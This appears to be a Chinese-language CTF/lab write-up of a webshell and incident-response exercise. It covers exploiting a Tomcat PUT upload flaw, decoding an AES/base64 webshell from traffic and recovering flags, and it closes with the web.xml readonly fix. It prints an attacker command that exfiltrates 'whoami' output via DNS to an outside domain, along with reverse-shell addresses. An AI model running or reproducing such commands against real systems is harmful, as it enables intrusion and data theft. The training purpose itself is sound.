---
UID: 20250607114602
aliases: 
tags:
  - 打靶
  - 靶场
  - 渗透
  - 应急响应
source: 
cssclasses: 
created: 2025-06-07
---

![image.png](https://s2.loli.net/2025/06/07/8QrFgBoCjwOyM1H.png)
[[某变异Webshell流量分析]]
## 渗透

### 扫描
![image.png](https://s2.loli.net/2025/06/07/HzFwZaWqNpxReQk.png)

fscan 扫描发现有个 8081 的 tomcat。有可能文件任意上传漏洞


### 搜索漏洞
![image.png](https://s2.loli.net/2025/06/07/MmC3AteuUHY9gX2.png)


### 漏洞利用
![image.png](https://s2.loli.net/2025/06/07/wBfuxcEHQrah1JR.png)

利用成功
![image.png](https://s2.loli.net/2025/06/07/S3sMTG1QmnWwbly.png)


上传一个反弹 shell
![image.png](https://s2.loli.net/2025/06/07/12Q5lTyZxgfndcm.png)

## 第一问
![image.png](https://s2.loli.net/2025/06/07/x5VURNjTkGd3AOm.png)

从 wireshark 报文能看出是上传 hello. jsp

flag{hello. jsp}

## 第二问
![image.png](https://s2.loli.net/2025/06/07/85SNHURLIOeotYB.png)

查看 post 包中，能找到密码

## 分析
要对木马进行分析

木马的大致功能是通过加载字节码来执行恶意代码，整个webshell的核心部分逻辑是在字节码中。

## 第三问
在查看 put 包的攻击者上传的马，用了 base 64 解码和 gunzip。找到了秘钥
![image.png](https://s2.loli.net/2025/06/07/9cCNxF4VnZGk8QI.png)


```
oszXCfTeXHpIkMS3
```

![image.png](https://s2.loli.net/2025/06/07/CAQNBbqXeLURFjz.png)

对木马进行分析，里面还有一端加密语法，继续拉到蓝队工具箱进行

也能找到

查看木马能知道。木马是对值进行了 base 64 加密，aes 加密最后加了个 gunzip
## 第四问和第五问
找到 hello. jsp 的木马的 post 包。按照顺序依次解码
![image.png](https://s2.loli.net/2025/06/07/FKd4UZHyc21EwqG.png)

```
ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org.
flag{ping -c 1 `whoami`.d5454c8975.ipv6.1433.eu.org.}
回显域名也在此
flag{d5454c8975.ipv6.1433.eu.org.}
d5454c8975.ipv6.1433.eu.org.
```

## 第六问
在最后一个木马的包中发现
![image.png](https://s2.loli.net/2025/06/07/O5Ea2rtJC9NmhiM.png)


应该是反链了

![image.png](https://s2.loli.net/2025/06/07/WwbthTML3qei1xv.png)

没做，就是反链
```
	flag{192.168.31.190|2024}
```

## 第七问

发现后面的流量都是 tls 的加密流量。刚好前面解密发现攻击者用了 key. log。上机提取一下

使用 pytohn 服务器传给主机
![image.png](https://s2.loli.net/2025/06/07/jykD9RlvmsceTPf.png)


![image.png](https://s2.loli.net/2025/06/07/lbERQUKDBFCWtJo.png)

跟踪 tls 流，能找到命令

![image.png](https://s2.loli.net/2025/06/07/aqTCiOvNfbGBd1A.png)

```
flag{ls}
```


## 第八问
上机排查
![image.png](https://s2.loli.net/2025/06/07/aPRcn3WlT2kKbH9.png)



发现一个文件自动删除三个文件
![image.png](https://s2.loli.net/2025/06/07/CNzbAsFiZWY78uQ.png)

我们重点检查这三个文件

![image.png](https://s2.loli.net/2025/06/07/6VWTktC5BRmlbuS.png)

云沙箱检查一下

![image.png](https://s2.loli.net/2025/06/07/uQD7at9Lmj81OZb.png)

```
flag{10.10.13.37|4444}
```

## 第九问
涉及 ctf，暂时不做

## 第十问
漏洞修复

Tomcat的 `web.xml` 中​**​默认servlet的 `readonly` 参数被显式设为 `false` ​**​时，攻击者可利用HTTP PUT方法上传恶意JSP文件并执行任意代。改成 true 就能修复

```
    <servlet>  
        <servlet-name>default</servlet-name>  
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>  
        <init-param>  
            <param-name>debug</param-name>  
            <param-value>0</param-value>  
        </init-param>  
        <init-param>  
            <param-name>listings</param-name>  
            <param-value>true</param-value>  
        </init-param>  
<init-param><param-name>readonly</param-name><param-value>true</param-value></init-param>  
        <load-on-startup>1</load-on-startup>  
    </servlet>
```